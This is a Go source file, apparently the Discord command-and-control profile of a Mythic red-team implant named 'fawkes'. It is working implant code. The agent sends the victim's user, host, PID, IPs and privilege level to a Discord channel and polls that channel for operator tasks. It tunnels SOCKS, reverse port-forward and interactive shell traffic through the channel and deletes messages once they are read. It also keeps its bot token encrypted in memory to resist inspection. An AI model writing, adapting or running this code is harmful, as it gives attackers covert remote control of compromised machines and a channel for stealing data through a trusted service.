package discord

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/hmac"
	"crypto/rand"
	"crypto/sha256"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"mime/multipart"
	"net/http"
	"net/textproto"
	"net/url"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"fawkes/pkg/structs"
)

const (
	discordAPIBase    = "https://discord.com/api/v10"
	maxMessageLength  = 1950 // Discord limit ~2000; server uses 1950 threshold
	defaultPollChecks = 10   // Default number of polling attempts per message exchange
	defaultPollDelay  = 10   // Default seconds between polling attempts
)

// MythicMessageWrapper is the envelope used to transport Mythic messages through
// a Discord channel. Both agent and server serialize/deserialize this format.
type MythicMessageWrapper struct {
	Message  string `json:"message"`   // Base64-encoded Mythic message (UUID + encrypted payload)
	SenderID string `json:"sender_id"` // UUID of sender (agent UUID or server UUID)
	ToServer bool   `json:"to_server"` // true = agent→server, false = server→agent
	ClientID string `json:"client_id"` // Tracking ID to correlate request/response
}

// discordMessage represents a Discord API message object (partial).
type discordMessage struct {
	ID          string              `json:"id"`
	Content     string              `json:"content"`
	Attachments []discordAttachment `json:"attachments"`
}

// discordAttachment represents a Discord file attachment.
type discordAttachment struct {
	ID       string `json:"id"`
	Filename string `json:"filename"`
	URL      string `json:"url"`
}

// configVault holds AES-256-GCM encrypted Discord configuration. Sensitive fields
// (bot token, channel ID, encryption key) are stored encrypted and only decrypted
// for the duration of each Discord API operation.
type configVault struct {
	key  []byte // AES-256-GCM key (random, generated at SealConfig)
	blob []byte // Encrypted JSON of sensitiveConfig
}

// sensitiveConfig holds Discord C2 fields that should not persist as plaintext.
type sensitiveConfig struct {
	BotToken      string `json:"t"`
	ChannelID     string `json:"c"`
	EncryptionKey string `json:"k"`
	CallbackUUID  string `json:"u"`
}

// DiscordProfile handles communication with Mythic through a Discord channel.
type DiscordProfile struct {
	BotToken      string
	ChannelID     string
	EncryptionKey string
	CallbackUUID  string
	SleepInterval int
	Jitter        int
	Debug         bool
	MaxRetries    int // message_checks: max polling attempts per exchange
	PollInterval  int // time_between_checks: seconds between polls
	UserAgent     string
	ProxyURL      string

	client   *http.Client
	vault    *configVault
	clientID atomic.Int64 // Monotonic counter for client_id tracking

	// mu protects CallbackUUID updates
	mu sync.Mutex

	// P2P delegate hooks — set by main.go when TCP P2P children are supported.
	GetDelegatesOnly     func() []structs.DelegateMessage
	GetDelegatesAndEdges func() ([]structs.DelegateMessage, []structs.P2PConnectionMessage)
	HandleDelegates      func(delegates []structs.DelegateMessage)

	// Rpfwd hooks — set by main.go for reverse port forward message routing.
	GetRpfwdOutbound func() []structs.SocksMsg
	HandleRpfwd      func(msgs []structs.SocksMsg)

	// Interactive hooks — set by main.go for PTY/terminal bidirectional streaming.
	GetInteractiveOutbound func() []structs.InteractiveMsg
	HandleInteractive      func(msgs []structs.InteractiveMsg)
}

// NewDiscordProfile creates a new Discord C2 profile.
func NewDiscordProfile(botToken, channelID, encryptionKey string, sleepInterval, jitter, maxRetries, pollInterval int, debug bool, userAgent, proxyURL string) *DiscordProfile {
	if maxRetries <= 0 {
		maxRetries = defaultPollChecks
	}
	if pollInterval <= 0 {
		pollInterval = defaultPollDelay
	}

	transport := &http.Transport{
		MaxIdleConns:        10,
		MaxIdleConnsPerHost: 5,
		IdleConnTimeout:     90 * time.Second,
	}
	if proxyURL != "" {
		if proxyU, err := url.Parse(proxyURL); err == nil {
			transport.Proxy = http.ProxyURL(proxyU)
		}
	}

	profile := &DiscordProfile{
		BotToken:      botToken,
		ChannelID:     channelID,
		EncryptionKey: encryptionKey,
		SleepInterval: sleepInterval,
		Jitter:        jitter,
		Debug:         debug,
		MaxRetries:    maxRetries,
		PollInterval:  pollInterval,
		UserAgent:     userAgent,
		ProxyURL:      proxyURL,
		client: &http.Client{
			Timeout:   30 * time.Second,
			Transport: transport,
		},
	}
	return profile
}

// SealConfig encrypts all sensitive Discord configuration fields into an AES-256-GCM
// vault and zeros the plaintext struct fields.
func (d *DiscordProfile) SealConfig() error {
	key := make([]byte, 32)
	if _, err := rand.Read(key); err != nil {
		return fmt.Errorf("config vault key generation failed: %w", err)
	}

	cfg := &sensitiveConfig{
		BotToken:      d.BotToken,
		ChannelID:     d.ChannelID,
		EncryptionKey: d.EncryptionKey,
		CallbackUUID:  d.CallbackUUID,
	}

	plaintext, err := json.Marshal(cfg)
	if err != nil {
		zeroBytes(key)
		return fmt.Errorf("config vault marshal failed: %w", err)
	}

	blob := vaultEncrypt(key, plaintext)
	zeroBytes(plaintext)
	if blob == nil {
		zeroBytes(key)
		return fmt.Errorf("config vault encryption failed")
	}

	d.vault = &configVault{key: key, blob: blob}

	// Zero plaintext struct fields
	d.BotToken = ""
	d.ChannelID = ""
	d.EncryptionKey = ""
	d.CallbackUUID = ""

	return nil
}

// getConfig returns the current Discord configuration. If the vault is active,
// decrypts and returns the config. Otherwise returns plaintext struct fields.
func (d *DiscordProfile) getConfig() *sensitiveConfig {
	if d.vault == nil {
		return &sensitiveConfig{
			BotToken:      d.BotToken,
			ChannelID:     d.ChannelID,
			EncryptionKey: d.EncryptionKey,
			CallbackUUID:  d.CallbackUUID,
		}
	}

	plaintext := vaultDecrypt(d.vault.key, d.vault.blob)
	if plaintext == nil {
		return nil
	}

	var cfg sensitiveConfig
	if err := json.Unmarshal(plaintext, &cfg); err != nil {
		zeroBytes(plaintext)
		return nil
	}
	zeroBytes(plaintext)
	return &cfg
}

// UpdateCallbackUUID updates the callback UUID in the vault (or struct field).
func (d *DiscordProfile) UpdateCallbackUUID(uuid string) {
	d.mu.Lock()
	defer d.mu.Unlock()

	if d.vault != nil {
		cfg := d.getConfig()
		if cfg != nil {
			cfg.CallbackUUID = uuid
			plaintext, err := json.Marshal(cfg)
			if err == nil {
				newBlob := vaultEncrypt(d.vault.key, plaintext)
				zeroBytes(plaintext)
				if newBlob != nil {
					zeroBytes(d.vault.blob)
					d.vault.blob = newBlob
				}
			}
		}
		return
	}
	d.CallbackUUID = uuid
}

// GetCallbackUUID returns the callback UUID assigned by Mythic after checkin.
func (d *DiscordProfile) GetCallbackUUID() string {
	d.mu.Lock()
	defer d.mu.Unlock()

	if d.vault != nil {
		if cfg := d.getConfig(); cfg != nil {
			return cfg.CallbackUUID
		}
	}
	return d.CallbackUUID
}

// getActiveUUID returns the callback UUID if available, otherwise the payload UUID.
func (d *DiscordProfile) getActiveUUID(agent *structs.Agent, cfg *sensitiveConfig) string {
	if cfg != nil && cfg.CallbackUUID != "" {
		return cfg.CallbackUUID
	}
	d.mu.Lock()
	cu := d.CallbackUUID
	d.mu.Unlock()
	if cu != "" {
		return cu
	}
	return agent.PayloadUUID
}

// nextClientID returns a unique tracking ID for correlating request/response pairs.
func (d *DiscordProfile) nextClientID() string {
	return strconv.FormatInt(d.clientID.Add(1), 10)
}

// ─── Profile Interface Methods ───────────────────────────────────────────────

// Checkin performs the initial checkin with Mythic via the Discord channel.
func (d *DiscordProfile) Checkin(agent *structs.Agent) error {
	cfg := d.getConfig()
	if cfg == nil {
		return fmt.Errorf("failed to decrypt Discord configuration")
	}

	checkinMsg := structs.CheckinMessage{
		Action:       "checkin",
		PayloadUUID:  agent.PayloadUUID,
		User:         agent.User,
		Host:         agent.Host,
		PID:          agent.PID,
		OS:           agent.OS,
		Architecture: agent.Architecture,
		Domain:       agent.Domain,
		IPs:          []string{agent.InternalIP},
		ExternalIP:   agent.ExternalIP,
		ProcessName:  agent.ProcessName,
		Integrity:    agent.Integrity,
	}

	body, err := json.Marshal(checkinMsg)
	if err != nil {
		return fmt.Errorf("failed to marshal checkin message: %w", err)
	}

	// Encrypt and format as Freyja-style: UUID + encrypted_body, then base64
	mythicMessage, err := d.buildMythicMessage(body, agent.PayloadUUID, cfg.EncryptionKey)
	if err != nil {
		return err
	}

	// Send via Discord and poll for response
	responseMessage, err := d.sendAndPoll(mythicMessage, agent.PayloadUUID, cfg)
	if err != nil {
		return fmt.Errorf("checkin via Discord failed: %w", err)
	}

	// Decrypt the response
	decrypted, err := d.unwrapResponse(responseMessage, cfg.EncryptionKey)
	if err != nil {
		return fmt.Errorf("failed to decrypt checkin response: %w", err)
	}

	// Parse checkin response to extract callback UUID
	var checkinResponse map[string]interface{}
	if err := json.Unmarshal(decrypted, &checkinResponse); err != nil {
		return fmt.Errorf("failed to parse checkin response: %w", err)
	}

	if callbackID, exists := checkinResponse["id"]; exists {
		if callbackStr, ok := callbackID.(string); ok {
			d.UpdateCallbackUUID(callbackStr)
			log.Printf("session: %s", callbackStr)
		}
	} else if callbackUUID, exists := checkinResponse["uuid"]; exists {
		if callbackStr, ok := callbackUUID.(string); ok {
			d.UpdateCallbackUUID(callbackStr)
			log.Printf("session: %s", callbackStr)
		}
	} else {
		log.Printf("no session id, using default")
		d.UpdateCallbackUUID(agent.PayloadUUID)
	}

	return nil
}

// GetTasking retrieves tasks and inbound SOCKS data from Mythic via Discord.
func (d *DiscordProfile) GetTasking(agent *structs.Agent, outboundSocks []structs.SocksMsg) ([]structs.Task, []structs.SocksMsg, error) {
	cfg := d.getConfig()
	if cfg == nil {
		return nil, nil, fmt.Errorf("failed to decrypt Discord configuration")
	}

	activeUUID := d.getActiveUUID(agent, cfg)

	taskingMsg := structs.TaskingMessage{
		Action:      "get_tasking",
		TaskingSize: -1,
		Socks:       outboundSocks,
		PayloadUUID: activeUUID,
		PayloadType: "fawkes",
		C2Profile:   "discord",
	}

	// Collect delegate messages from linked P2P children
	if d.GetDelegatesOnly != nil {
		delegates := d.GetDelegatesOnly()
		if len(delegates) > 0 {
			taskingMsg.Delegates = delegates
		}
	}

	// Collect rpfwd outbound messages
	if d.GetRpfwdOutbound != nil {
		rpfwdMsgs := d.GetRpfwdOutbound()
		if len(rpfwdMsgs) > 0 {
			taskingMsg.Rpfwd = rpfwdMsgs
		}
	}

	// Collect interactive outbound messages (PTY output)
	if d.GetInteractiveOutbound != nil {
		interactiveMsgs := d.GetInteractiveOutbound()
		if len(interactiveMsgs) > 0 {
			taskingMsg.Interactive = interactiveMsgs
		}
	}

	body, err := json.Marshal(taskingMsg)
	if err != nil {
		return nil, nil, fmt.Errorf("failed to marshal tasking message: %w", err)
	}

	mythicMessage, err := d.buildMythicMessage(body, activeUUID, cfg.EncryptionKey)
	if err != nil {
		return nil, nil, err
	}

	responseMessage, err := d.sendAndPoll(mythicMessage, activeUUID, cfg)
	if err != nil {
		return nil, nil, fmt.Errorf("get tasking via Discord failed: %w", err)
	}

	decryptedData, err := d.unwrapResponse(responseMessage, cfg.EncryptionKey)
	if err != nil {
		return nil, nil, fmt.Errorf("failed to decrypt tasking response: %w", err)
	}

	// Parse the decrypted response
	var taskResponse map[string]interface{}
	if err := json.Unmarshal(decryptedData, &taskResponse); err != nil {
		return []structs.Task{}, nil, nil
	}

	// Extract tasks
	var tasks []structs.Task
	if taskList, exists := taskResponse["tasks"]; exists {
		if taskArray, ok := taskList.([]interface{}); ok {
			for _, taskData := range taskArray {
				if taskMap, ok := taskData.(map[string]interface{}); ok {
					task := structs.NewTask(
						getString(taskMap, "id"),
						getString(taskMap, "command"),
						getString(taskMap, "parameters"),
					)
					tasks = append(tasks, task)
				}
			}
		}
	}

	// Extract SOCKS messages
	var inboundSocks []structs.SocksMsg
	if socksList, exists := taskResponse["socks"]; exists {
		if socksRaw, err := json.Marshal(socksList); err == nil {
			if err := json.Unmarshal(socksRaw, &inboundSocks); err != nil {
				log.Printf("proxy parse error: %v", err)
			}
		}
	}

	// Route rpfwd messages
	if d.HandleRpfwd != nil {
		if rpfwdList, exists := taskResponse["rpfwd"]; exists {
			if rpfwdRaw, err := json.Marshal(rpfwdList); err == nil {
				var rpfwdMsgs []structs.SocksMsg
				if err := json.Unmarshal(rpfwdRaw, &rpfwdMsgs); err == nil && len(rpfwdMsgs) > 0 {
					d.HandleRpfwd(rpfwdMsgs)
				}
			}
		}
	}

	// Route interactive messages
	if d.HandleInteractive != nil {
		if interactiveList, exists := taskResponse["interactive"]; exists {
			if interactiveRaw, err := json.Marshal(interactiveList); err == nil {
				var interactiveMsgs []structs.InteractiveMsg
				if err := json.Unmarshal(interactiveRaw, &interactiveMsgs); err == nil && len(interactiveMsgs) > 0 {
					d.HandleInteractive(interactiveMsgs)
				}
			}
		}
	}

	// Route delegate messages
	if d.HandleDelegates != nil {
		if delegateList, exists := taskResponse["delegates"]; exists {
			if delegateRaw, err := json.Marshal(delegateList); err == nil {
				var delegates []structs.DelegateMessage
				if err := json.Unmarshal(delegateRaw, &delegates); err == nil && len(delegates) > 0 {
					d.HandleDelegates(delegates)
				}
			}
		}
	}

	return tasks, inboundSocks, nil
}

// PostResponse sends a response back to Mythic via Discord.
func (d *DiscordProfile) PostResponse(response structs.Response, agent *structs.Agent, socks []structs.SocksMsg) ([]byte, error) {
	cfg := d.getConfig()
	if cfg == nil {
		return nil, fmt.Errorf("failed to decrypt Discord configuration")
	}

	activeUUID := d.getActiveUUID(agent, cfg)

	responseMsg := structs.PostResponseMessage{
		Action:    "post_response",
		Responses: []structs.Response{response},
		Socks:     socks,
	}

	// Collect rpfwd outbound messages
	if d.GetRpfwdOutbound != nil {
		rpfwdMsgs := d.GetRpfwdOutbound()
		if len(rpfwdMsgs) > 0 {
			responseMsg.Rpfwd = rpfwdMsgs
		}
	}

	// Collect delegate messages and edge notifications
	if d.GetDelegatesAndEdges != nil {
		delegates, edges := d.GetDelegatesAndEdges()
		if len(delegates) > 0 {
			responseMsg.Delegates = delegates
		}
		if len(edges) > 0 {
			responseMsg.Edges = edges
		}
	}

	// Collect interactive outbound messages
	if d.GetInteractiveOutbound != nil {
		interactiveMsgs := d.GetInteractiveOutbound()
		if len(interactiveMsgs) > 0 {
			responseMsg.Interactive = interactiveMsgs
		}
	}

	body, err := json.Marshal(responseMsg)
	if err != nil {
		return nil, fmt.Errorf("failed to marshal response message: %w", err)
	}

	mythicMessage, err := d.buildMythicMessage(body, activeUUID, cfg.EncryptionKey)
	if err != nil {
		return nil, err
	}

	responseData, err := d.sendAndPoll(mythicMessage, activeUUID, cfg)
	if err != nil {
		return nil, fmt.Errorf("post response via Discord failed: %w", err)
	}

	decryptedData, err := d.unwrapResponse(responseData, cfg.EncryptionKey)
	if err != nil {
		return nil, fmt.Errorf("failed to decrypt PostResponse: %w", err)
	}

	// Route any PostResponse data (delegates, rpfwd, interactive)
	if len(decryptedData) > 0 {
		var postRespData map[string]interface{}
		if err := json.Unmarshal(decryptedData, &postRespData); err == nil {
			if d.HandleRpfwd != nil {
				if rpfwdList, exists := postRespData["rpfwd"]; exists {
					if rpfwdRaw, err := json.Marshal(rpfwdList); err == nil {
						var rpfwdMsgs []structs.SocksMsg
						if err := json.Unmarshal(rpfwdRaw, &rpfwdMsgs); err == nil && len(rpfwdMsgs) > 0 {
							d.HandleRpfwd(rpfwdMsgs)
						}
					}
				}
			}
			if d.HandleDelegates != nil {
				if delegateList, exists := postRespData["delegates"]; exists {
					if delegateRaw, err := json.Marshal(delegateList); err == nil {
						var delegates []structs.DelegateMessage
						if err := json.Unmarshal(delegateRaw, &delegates); err == nil && len(delegates) > 0 {
							d.HandleDelegates(delegates)
						}
					}
				}
			}
			if d.HandleInteractive != nil {
				if interactiveList, exists := postRespData["interactive"]; exists {
					if interactiveRaw, err := json.Marshal(interactiveList); err == nil {
						var interactiveMsgs []structs.InteractiveMsg
						if err := json.Unmarshal(interactiveRaw, &interactiveMsgs); err == nil && len(interactiveMsgs) > 0 {
							d.HandleInteractive(interactiveMsgs)
						}
					}
				}
			}
		}
	}

	return decryptedData, nil
}

// ─── Discord API Methods ─────────────────────────────────────────────────────

// sendAndPoll sends a Mythic message via Discord and polls for the server's response.
// mythicMessage is the base64-encoded Mythic message (UUID + encrypted payload).
// senderID is the agent's UUID used for message correlation.
func (d *DiscordProfile) sendAndPoll(mythicMessage, senderID string, cfg *sensitiveConfig) (string, error) {
	clientID := d.nextClientID()

	wrapper := MythicMessageWrapper{
		Message:  mythicMessage,
		SenderID: senderID,
		ToServer: true,
		ClientID: clientID,
	}

	wrapperJSON, err := json.Marshal(wrapper)
	if err != nil {
		return "", fmt.Errorf("failed to marshal wrapper: %w", err)
	}

	// Send to Discord — use file attachment if message is too large
	if len(wrapperJSON) > maxMessageLength {
		if err := d.sendFileMessage(wrapperJSON, senderID+"server", cfg); err != nil {
			return "", fmt.Errorf("file upload failed: %w", err)
		}
	} else {
		if err := d.sendTextMessage(string(wrapperJSON), cfg); err != nil {
			return "", fmt.Errorf("text message failed: %w", err)
		}
	}

	// Poll for response matching our sender_id with to_server=false
	for attempt := 0; attempt < d.MaxRetries; attempt++ {
		time.Sleep(time.Duration(d.PollInterval) * time.Second)

		messages, err := d.getMessages(cfg, 50)
		if err != nil {
			log.Printf("poll error (attempt %d): %v", attempt+1, err)
			continue
		}

		for _, msg := range messages {
			respWrapper, err := d.parseDiscordMessage(msg, cfg)
			if err != nil {
				continue
			}

			// Match: to_server=false and sender_id matches (server echoes our sender_id back)
			// or client_id matches our tracking ID
			if !respWrapper.ToServer && (respWrapper.ClientID == clientID || respWrapper.SenderID == senderID) {
				// Delete the response message from the channel after reading
				d.deleteMessage(msg.ID, cfg)
				return respWrapper.Message, nil
			}
		}
	}

	return "", fmt.Errorf("no response after %d polling attempts", d.MaxRetries)
}

// parseDiscordMessage extracts a MythicMessageWrapper from a Discord message.
// Handles both inline text and file attachment formats.
func (d *DiscordProfile) parseDiscordMessage(msg discordMessage, cfg *sensitiveConfig) (*MythicMessageWrapper, error) {
	var wrapperJSON []byte

	if len(msg.Attachments) > 0 {
		// Server sends large messages as file attachments
		content, err := d.downloadAttachment(msg.Attachments[0].URL, cfg)
		if err != nil {
			return nil, fmt.Errorf("failed to download attachment: %w", err)
		}
		wrapperJSON = content
	} else if msg.Content != "" {
		wrapperJSON = []byte(msg.Content)
	} else {
		return nil, fmt.Errorf("empty message")
	}

	// Handle potential double-serialization (server's Unescape logic)
	cleaned := string(wrapperJSON)
	if strings.HasPrefix(cleaned, "\"") && strings.HasSuffix(cleaned, "\"") {
		cleaned = cleaned[1 : len(cleaned)-1]
		cleaned = strings.ReplaceAll(cleaned, "\\\"", "\"")
	}

	var wrapper MythicMessageWrapper
	if err := json.Unmarshal([]byte(cleaned), &wrapper); err != nil {
		return nil, fmt.Errorf("failed to parse wrapper: %w", err)
	}

	return &wrapper, nil
}

// sendTextMessage sends a text message to the Discord channel.
func (d *DiscordProfile) sendTextMessage(content string, cfg *sensitiveConfig) error {
	endpoint := fmt.Sprintf("%s/channels/%s/messages", discordAPIBase, cfg.ChannelID)

	payload := map[string]string{"content": content}
	body, _ := json.Marshal(payload)

	req, err := http.NewRequest("POST", endpoint, bytes.NewReader(body))
	if err != nil {
		return err
	}
	req.Header.Set("Authorization", "Bot "+cfg.BotToken)
	req.Header.Set("Content-Type", "application/json")
	if d.UserAgent != "" {
		req.Header.Set("User-Agent", d.UserAgent)
	}

	resp, err := d.doWithRateLimit(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode < 200 || resp.StatusCode >= 300 {
		respBody, _ := io.ReadAll(resp.Body)
		return fmt.Errorf("discord API error %d: %s", resp.StatusCode, string(respBody))
	}

	return nil
}

// sendFileMessage sends a file attachment to the Discord channel.
// filename should end with "server" for agent→server messages.
func (d *DiscordProfile) sendFileMessage(content []byte, filename string, cfg *sensitiveConfig) error {
	endpoint := fmt.Sprintf("%s/channels/%s/messages", discordAPIBase, cfg.ChannelID)

	var buf bytes.Buffer
	writer := multipart.NewWriter(&buf)

	// Create the file part with proper content type
	partHeader := make(textproto.MIMEHeader)
	partHeader.Set("Content-Disposition", fmt.Sprintf(`form-data; name="files[0]"; filename="%s"`, filename))
	partHeader.Set("Content-Type", "application/octet-stream")

	part, err := writer.CreatePart(partHeader)
	if err != nil {
		return fmt.Errorf("failed to create multipart part: %w", err)
	}
	if _, err := part.Write(content); err != nil {
		return fmt.Errorf("failed to write file content: %w", err)
	}
	writer.Close()

	req, err := http.NewRequest("POST", endpoint, &buf)
	if err != nil {
		return err
	}
	req.Header.Set("Authorization", "Bot "+cfg.BotToken)
	req.Header.Set("Content-Type", writer.FormDataContentType())
	if d.UserAgent != "" {
		req.Header.Set("User-Agent", d.UserAgent)
	}

	resp, err := d.doWithRateLimit(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode < 200 || resp.StatusCode >= 300 {
		respBody, _ := io.ReadAll(resp.Body)
		return fmt.Errorf("discord file upload error %d: %s", resp.StatusCode, string(respBody))
	}

	return nil
}

// getMessages retrieves recent messages from the Discord channel.
func (d *DiscordProfile) getMessages(cfg *sensitiveConfig, limit int) ([]discordMessage, error) {
	endpoint := fmt.Sprintf("%s/channels/%s/messages?limit=%d", discordAPIBase, cfg.ChannelID, limit)

	req, err := http.NewRequest("GET", endpoint, nil)
	if err != nil {
		return nil, err
	}
	req.Header.Set("Authorization", "Bot "+cfg.BotToken)
	if d.UserAgent != "" {
		req.Header.Set("User-Agent", d.UserAgent)
	}

	resp, err := d.doWithRateLimit(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		respBody, _ := io.ReadAll(resp.Body)
		return nil, fmt.Errorf("discord API error %d: %s", resp.StatusCode, string(respBody))
	}

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}

	var messages []discordMessage
	if err := json.Unmarshal(body, &messages); err != nil {
		return nil, fmt.Errorf("failed to parse messages: %w", err)
	}

	return messages, nil
}

// deleteMessage removes a message from the Discord channel.
func (d *DiscordProfile) deleteMessage(messageID string, cfg *sensitiveConfig) {
	endpoint := fmt.Sprintf("%s/channels/%s/messages/%s", discordAPIBase, cfg.ChannelID, messageID)

	req, err := http.NewRequest("DELETE", endpoint, nil)
	if err != nil {
		log.Printf("delete request error: %v", err)
		return
	}
	req.Header.Set("Authorization", "Bot "+cfg.BotToken)
	if d.UserAgent != "" {
		req.Header.Set("User-Agent", d.UserAgent)
	}

	resp, err := d.doWithRateLimit(req)
	if err != nil {
		log.Printf("delete error: %v", err)
		return
	}
	resp.Body.Close()
}

// downloadAttachment downloads file content from a Discord attachment URL.
func (d *DiscordProfile) downloadAttachment(attachmentURL string, cfg *sensitiveConfig) ([]byte, error) {
	req, err := http.NewRequest("GET", attachmentURL, nil)
	if err != nil {
		return nil, err
	}
	// Attachment URLs are CDN URLs that don't need bot auth
	if d.UserAgent != "" {
		req.Header.Set("User-Agent", d.UserAgent)
	}

	resp, err := d.client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("attachment download failed: status %d", resp.StatusCode)
	}

	return io.ReadAll(resp.Body)
}

// doWithRateLimit executes an HTTP request with Discord rate limit handling.
// On 429 responses, it waits for the Retry-After duration and retries.
func (d *DiscordProfile) doWithRateLimit(req *http.Request) (*http.Response, error) {
	for attempt := 0; attempt < 5; attempt++ {
		// Clone the request for retries (body may be consumed)
		var reqCopy *http.Request
		if attempt == 0 {
			reqCopy = req
		} else {
			var err error
			reqCopy, err = cloneRequest(req)
			if err != nil {
				return nil, err
			}
		}

		resp, err := d.client.Do(reqCopy)
		if err != nil {
			return nil, err
		}

		if resp.StatusCode != http.StatusTooManyRequests {
			return resp, nil
		}

		// Rate limited — parse Retry-After and wait
		resp.Body.Close()
		retryAfter := resp.Header.Get("Retry-After")
		waitSeconds := 5.0 // Default backoff
		if retryAfter != "" {
			if parsed, err := strconv.ParseFloat(retryAfter, 64); err == nil {
				waitSeconds = parsed
			}
		}
		log.Printf("rate limited, retry in %.1fs", waitSeconds)
		time.Sleep(time.Duration(waitSeconds*1000) * time.Millisecond)
	}
	return nil, fmt.Errorf("rate limited after 5 retries")
}

// cloneRequest creates a copy of an HTTP request for retry purposes.
func cloneRequest(req *http.Request) (*http.Request, error) {
	clone := req.Clone(req.Context())
	if req.Body != nil {
		bodyBytes, err := io.ReadAll(req.Body)
		if err != nil {
			return nil, err
		}
		req.Body = io.NopCloser(bytes.NewReader(bodyBytes))
		clone.Body = io.NopCloser(bytes.NewReader(bodyBytes))
	}
	return clone, nil
}

// ─── Mythic Message Encryption ───────────────────────────────────────────────

// buildMythicMessage encrypts and formats a message in the standard Mythic format:
// base64(UUID + AES-CBC-encrypted-payload).
func (d *DiscordProfile) buildMythicMessage(payload []byte, uuid, encKey string) (string, error) {
	var encrypted []byte
	var err error

	if encKey != "" {
		encrypted, err = encryptMessage(payload, encKey)
		if err != nil {
			return "", fmt.Errorf("encryption failed: %w", err)
		}
	} else {
		encrypted = payload
	}

	messageData := append([]byte(uuid), encrypted...)
	return base64.StdEncoding.EncodeToString(messageData), nil
}

// unwrapResponse decodes and decrypts a Mythic response message.
// The input is the base64-encoded message from the MythicMessageWrapper.message field.
func (d *DiscordProfile) unwrapResponse(message, encKey string) ([]byte, error) {
	if encKey != "" {
		decoded, err := base64.StdEncoding.DecodeString(message)
		if err != nil {
			return nil, fmt.Errorf("failed to base64 decode response: %w", err)
		}
		return decryptResponse(decoded, encKey)
	}

	// No encryption — just base64 decode
	decoded, err := base64.StdEncoding.DecodeString(message)
	if err != nil {
		return nil, fmt.Errorf("failed to decode response: %w", err)
	}
	// Skip UUID prefix (36 bytes) if present
	if len(decoded) > 36 {
		return decoded[36:], nil
	}
	return decoded, nil
}

// encryptMessage encrypts data using AES-256-CBC + HMAC-SHA256 (Freyja format).
// Returns: IV (16) + Ciphertext + HMAC (32)
func encryptMessage(msg []byte, encKey string) ([]byte, error) {
	if encKey == "" {
		return msg, nil
	}

	key, err := base64.StdEncoding.DecodeString(encKey)
	if err != nil {
		return nil, fmt.Errorf("failed to decode encryption key: %w", err)
	}

	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, fmt.Errorf("failed to create AES cipher: %w", err)
	}

	iv := make([]byte, aes.BlockSize)
	if _, err := io.ReadFull(rand.Reader, iv); err != nil {
		return nil, fmt.Errorf("failed to generate IV: %w", err)
	}

	mode := cipher.NewCBCEncrypter(block, iv)

	padded := pkcs7Pad(msg, aes.BlockSize)
	encrypted := make([]byte, len(padded))
	mode.CryptBlocks(encrypted, padded)

	ivCiphertext := append(iv, encrypted...)

	hmacHash := hmac.New(sha256.New, key)
	hmacHash.Write(ivCiphertext)
	hmacBytes := hmacHash.Sum(nil)

	// Zero the key after use
	zeroBytes(key)

	return append(ivCiphertext, hmacBytes...), nil
}

// decryptResponse decrypts a Mythic response (Freyja format).
// Input format: UUID (36) + IV (16) + Ciphertext + HMAC (32)
func decryptResponse(encryptedData []byte, encKey string) ([]byte, error) {
	if encKey == "" {
		return encryptedData, nil
	}

	key, err := base64.StdEncoding.DecodeString(encKey)
	if err != nil {
		return nil, fmt.Errorf("failed to decode encryption key: %w", err)
	}
	defer zeroBytes(key)

	// UUID (36) + IV (16) + at least 1 block + HMAC (32)
	if len(encryptedData) < 36+16+32 {
		return nil, fmt.Errorf("encrypted data too short: %d bytes", len(encryptedData))
	}

	iv := encryptedData[36:52]
	hmacBytes := encryptedData[len(encryptedData)-32:]
	ciphertext := encryptedData[52 : len(encryptedData)-32]

	// Verify HMAC (try full data minus HMAC first, then IV+ciphertext only)
	mac := hmac.New(sha256.New, key)
	mac.Write(encryptedData[:len(encryptedData)-32])
	expectedHmac := mac.Sum(nil)

	if !hmac.Equal(hmacBytes, expectedHmac) {
		mac2 := hmac.New(sha256.New, key)
		mac2.Write(encryptedData[36 : len(encryptedData)-32])
		expectedHmac2 := mac2.Sum(nil)
		if !hmac.Equal(hmacBytes, expectedHmac2) {
			return nil, fmt.Errorf("HMAC verification failed")
		}
	}

	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, fmt.Errorf("failed to create AES cipher: %w", err)
	}

	if len(ciphertext) == 0 || len(ciphertext)%aes.BlockSize != 0 {
		return nil, fmt.Errorf("invalid ciphertext length: %d", len(ciphertext))
	}

	mode := cipher.NewCBCDecrypter(block, iv)
	plaintext := make([]byte, len(ciphertext))
	mode.CryptBlocks(plaintext, ciphertext)

	// Remove PKCS#7 padding
	padding := int(plaintext[len(plaintext)-1])
	if padding > aes.BlockSize || padding == 0 {
		return nil, fmt.Errorf("invalid padding")
	}
	for i := len(plaintext) - padding; i < len(plaintext); i++ {
		if plaintext[i] != byte(padding) {
			return nil, fmt.Errorf("invalid padding")
		}
	}

	return plaintext[:len(plaintext)-padding], nil
}

// pkcs7Pad adds PKCS#7 padding to data.
func pkcs7Pad(data []byte, blockSize int) []byte {
	padding := blockSize - len(data)%blockSize
	padText := bytes.Repeat([]byte{byte(padding)}, padding)
	return append(data, padText...)
}

// ─── Config Vault Cryptography ───────────────────────────────────────────────

// vaultEncrypt encrypts plaintext with AES-256-GCM (nonce prepended).
func vaultEncrypt(key, plaintext []byte) []byte {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil
	}
	nonce := make([]byte, gcm.NonceSize())
	if _, err := rand.Read(nonce); err != nil {
		return nil
	}
	return gcm.Seal(nonce, nonce, plaintext, nil)
}

// vaultDecrypt decrypts AES-256-GCM ciphertext with prepended nonce.
func vaultDecrypt(key, ciphertext []byte) []byte {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil
	}
	nonceSize := gcm.NonceSize()
	if len(ciphertext) < nonceSize+1 {
		return nil
	}
	nonce, ct := ciphertext[:nonceSize], ciphertext[nonceSize:]
	plaintext, err := gcm.Open(nil, nonce, ct, nil)
	if err != nil {
		return nil
	}
	return plaintext
}

// zeroBytes overwrites a byte slice with zeros.
